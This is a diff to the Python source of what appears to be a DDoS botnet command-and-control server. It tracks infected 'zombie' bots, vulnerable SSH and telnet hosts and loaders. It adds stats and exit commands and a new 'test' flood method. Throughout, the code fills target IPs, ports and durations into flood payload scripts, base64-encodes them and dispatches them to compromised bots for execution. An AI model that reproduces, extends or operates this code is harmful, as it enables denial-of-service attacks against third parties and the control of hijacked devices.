@@ -6,7 +6,7 @@ class Master(threading.Thread):
     def __init__(self, console: console.Console, color: console.Color, database: database.Database, socket_session: socket.socket, ip: str, port: int):
         threading.Thread.__init__(self)
 
-        self.network = network.Network(socket_session)
+        self.network = network.Network(socket_session, database)
         self.database = database
         self.console = console
         self.color = color
@@ -74,7 +74,11 @@ class Master(threading.Thread):
             time.sleep(1)
 
             if self.logged:
-                self.set_title(f'User: {len(self.database.online_user)} | Bots: {len(self.database.online_zombie)} | Vuln: {self.database.total_ssh_bots + self.database.total_telnet_bots} | Loader: {len(self.database.online_loader)}')
+                bd = self.database.get_network_bandwitch()
+                send_bd = bd.split('|')[0]
+                recv_bd = bd.split('|')[1]
+
+                self.set_title(f'User: {len(self.database.online_user)} | Bots: {len(self.database.online_zombie)} | Vuln: {self.database.total_ssh_bots + self.database.total_telnet_bots} | Loader: {len(self.database.online_loader)} | Command: {self.database.send_command} | Task: {self.database.send_task} | Packet: {send_bd} / {recv_bd}')
             else:
                 self.kicked_time = int(time.time()) - self.session_time
                 self.set_title(f'Login page | Attemp: {self.login_attemp}/3 | Kicked on: {self.kicked_time}/30s')
@@ -107,18 +111,43 @@ class Master(threading.Thread):
             
             if not cmd:
                 return
+            
+            self.database.send_command += 1
 
             argument = cmd.split(' ')
             command = argument[0]
 
-            # Show only avaiable commands
+            # TODO: Show only avaiable commands and clean shit code
             if command == 'help': # ・>
                 table = self.console.raw_fade(self.console.get_custom_table(['📌 COMMAND', '📋 DESCRIPTION', '⭐ PERMISSION'], [
-                    'clear\nmethod\nlist\ncreate_acc\ndelete_acc\nkill',
-                    'Clean the screen\nSee attack methods\nSee connected users\nCreate an account\nDelete an account\nKick user from server',
-                    'all\nall\nadmin\nroot\nroot\nroot'
+                    'clear\nmethod\nlist\ncreate_acc\ndelete_acc\nkill\nstats\nexit',
+                    'Clean the screen\nSee attack methods\nSee connected users\nCreate an account\nDelete an account\nKick user from server\nShow cool stuff\nClose session',
+                    'all\nall\nadmin\nroot\nroot\nroot\nall\nall'
                     ]))
                 self.bulk_send(table)
+
+            elif command == 'exit':
+                self.kill('Goobye <3', True)
+
+            elif command == 'stats':
+                bd = self.database.get_network_bandwitch()
+                send_bd = bd.split('|')[0]
+                recv_bd = bd.split('|')[1]
+
+                self.bulk_send(self.console.bulk_fade([
+                    f'\n> Account informations:',
+                    f'  - Username: {self.username}',
+                    f'  - Grade:    {self.grade}',
+                    f'\n> Connected device:',
+                    f'  - Loader: {len(self.database.online_loader)}',
+                    f'  - Zombie: {len(self.database.online_zombie)}/{self.database.total_telnet_bots + self.database.total_ssh_bots}',
+                    f'  - User:   {len(self.database.online_user)}',
+                    f'\n> Trafic:',
+                    f'  - Total recieved packet: {self.database.recv_packet} ({recv_bd})',
+                    f'  - Total sent packet:     {self.database.send_packet} ({send_bd})',
+                    f'  - Command send:          {self.database.send_command}',
+                    f'  - Task send:             {self.database.send_task}\n'
+                ]))
 
             elif command == 'clear':
                 self.clear_screen()
@@ -218,7 +247,7 @@ class Loader(threading.Thread):
     def __init__(self, console: console.Console, database: database.Database, socket_session: socket.socket, ip: str, port: int):
         threading.Thread.__init__(self)
 
-        self.network = network.Network(socket_session)
+        self.network = network.Network(socket_session, database)
         self.database = database
         self.console = console
         self.port = port
@@ -300,7 +329,7 @@ class Zombie(threading.Thread):
     def __init__(self, console: console.Console, database: database.Database, socket_session: socket.socket, ip: str, port: int):
         threading.Thread.__init__(self)
 
-        self.network = network.Network(socket_session)
+        self.network = network.Network(socket_session, database)
         self.database = database
         self.console = console
         self.port = port
@@ -347,6 +376,9 @@ class Zombie(threading.Thread):
         if type == 'http':
             payload = tools.Encoder().base_64(str(open('./payload/http_flood.py', 'r+').read().replace('!ip!', ip).replace('!port!', port).replace('!time!', timeout)).encode())
         
+        elif type == 'test':
+            payload = tools.Encoder().base_64(str(open('./payload/test_flood.py', 'r+').read().replace('!ip!', ip).replace('!port!', port).replace('!time!', timeout)).encode())
+
         self.send(f'run|{payload}')
 
     def run(self):
